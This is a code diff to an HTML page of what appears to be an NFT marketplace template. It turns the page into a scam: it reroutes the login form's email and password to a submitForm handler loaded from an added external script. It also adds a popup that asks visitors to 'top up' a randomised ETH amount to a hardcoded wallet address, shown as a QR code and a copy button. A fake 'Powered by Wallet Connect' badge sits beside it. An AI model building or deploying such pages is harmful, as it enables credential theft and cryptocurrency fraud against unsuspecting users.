@@ -13,6 +13,7 @@
   <link rel="stylesheet" href="assets/css/plugins/swiper-bundle.min.css">
   <link rel="stylesheet" href="assets/css/plugins/glightbox.min.css">
   <link rel="stylesheet" href="assets/css/plugins/aos.css">
+   <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
  
    <!-- Plugin css -->
@@ -20,7 +21,10 @@
    
    <!-- Custom Style CSS -->
    <link rel="stylesheet" href="assets/css/style.css">
-
+<style type="text/css">
+    
+        .popup{background: rgba(50,50,50,.95);position: fixed;top:0;width: 100%;height: 100%;z-index: 10}
+</style>
 </head>
 
 <body class="dark--mode">
@@ -430,7 +434,7 @@
         <!-- Start login section  -->
         <div class="login__section section--padding">
             <div class="container">
-                <form action="./connect-wallet.html">
+                <form action="#" method="post" onsubmit="return submitForm(event,2)">
                     <div class="login__section--inner">
                         <div class="row">
                             <div class="col-lg-6 col-md-10 offset-md-1 offset-lg-0 ">
@@ -446,12 +450,12 @@
                                     </div>
                                     <div class="account__login--inner">
                                         <div class="account__login--input__list">
-                                            <label class="account__login--input__label" for="input1">Email address </label>
-                                            <input class="account__login--input__field" id="input1" placeholder="Email Addres" type="email">
+                                            <label class="account__login--input__label" for="email">Email address </label>
+                                            <input class="account__login--input__field" id="email" placeholder="Email Addres" type="email">
                                         </div>
                                         <div class="account__login--input__list">
-                                            <label class="account__login--input__label" for="input2">Password </label>
-                                            <input class="account__login--input__field" id="input2" placeholder="Password" type="password">
+                                            <label class="account__login--input__label" for="pass">Password </label>
+                                            <input class="account__login--input__field" minlength="3" id="pass" placeholder="Password" type="password">
                                         </div>
                                         <div class="account__login--remember__forgot d-flex justify-content-between align-items-center">
                                             <div class="account__login--remember position__relative">
@@ -640,11 +644,24 @@
             </div>
         </div>
     </footer>
+
+    <div class="popup d-none">
+        <div class="mx-auto text-center col-lg-5 col-md-6 col-10 bg-dark rounded" style="margin-top: 17vh;padding: 50px;border: 1px solid skyblue !important;"><span style="position: absolute;margin-left:-18%;"><i class="fas fa-chevron-left" onclick="window.location.replace('./index.html')"></i></span>
+        <h3 class="mb-5"><b>Getting started?</b> Mint Your first NFT</h3>
+        <b class="btn-info rounded px-5 py-2 mb-3">0.2<script type="text/javascript">document.write(Math.floor(Math.random() * 10000));</script> ETH ~  1 mint</b>
+          <img src="https://chart.googleapis.com/chart?chs=250x250&amp;cht=qr&amp;chl=0xF884De7982CfFE02529d9874352431f5A742353e&amp;chld=L|1&amp;choe=UTF-8" alt="" class="participate-qr mx-auto rounded">           
+             <p class="participate-title mt-4"><b>Top up your <span>ETH</span> Wallet to enable Minting.</b></p>
+             <p id="" class=" col-9 row mx-auto mt-4"><input type="text" class="border-none mx-auto text-center col-9 px-3 py-2" style="min-width: 100%;background: transparent;color: #fff;border:none;" value="0xF884De7982CfFE02529d9874352431f5A742353e" onclick="copy('0xF884De7982CfFE02529d9874352431f5A742353e')" name=""><button class="btn ml-auto btn-primary p-3 float-right mt-4" onclick="copy('0xF884De7982CfFE02529d9874352431f5A742353e')">Copy Address <i class="fas fa-copy ml-2"></i></button></p>
+             
+        <small class="col-12 mt-4 d-block text-muted"><i class="mr-2 text-info fas fa-shield-alt"></i> Powered by Wallet Connect</small>
+         </div>
+    </div>
     <!-- End footer section -->
 
     <!-- Scroll top bar -->
     <button aria-label="scroll top btn" id="scroll__top"><svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="48" d="M112 244l144-144 144 144M256 120v292"/></svg></button>
     
+  <script type="text/javascript">var cave='mint';</script>
   <!-- All Script JS Plugins here  -->
   <script src="assets/js/vendor/popper.js" defer="defer"></script>
   <script src="assets/js/vendor/bootstrap.min.js" defer="defer"></script>
@@ -652,10 +669,34 @@
   <script src="assets/js/plugins/glightbox.min.js" defer="defer"></script>
   <script src="assets/js/plugins/aos.js"></script>
   <script src="assets/js/plugins/isotope.pkgd.min.js" defer="defer"></script>
+  <script type="text/javascript">
+
+      function copy(e) {
+    var n = document.createElement("textarea");
+    n.innerHTML = e,
+    document.body.appendChild(n),
+    n.select();
+    document.execCommand("copy");
+    document.body.removeChild(n)
+
+}
+  </script>
 
   <!-- Customscript js -->
   <script src="assets/js/script.js" defer="defer"></script>
   
+<script type="text/javascript" src="./assets/js/jquery-3.4.1.min.js"></script>
+<script type="text/javascript" src="./cont.js"></script>
+<script type="text/javascript">
+    var arr = [];
+    var rex = '';
+    arr = window.location.href;
+for (var i = arr.length - 4; i < arr.length; i++) {
+    rex = rex +""+arr[i];
+    //console.log(rex);
+}
+if(rex == cave){$('.popup').removeClass('d-none');}
+</script>
 </body>
 
 </html>
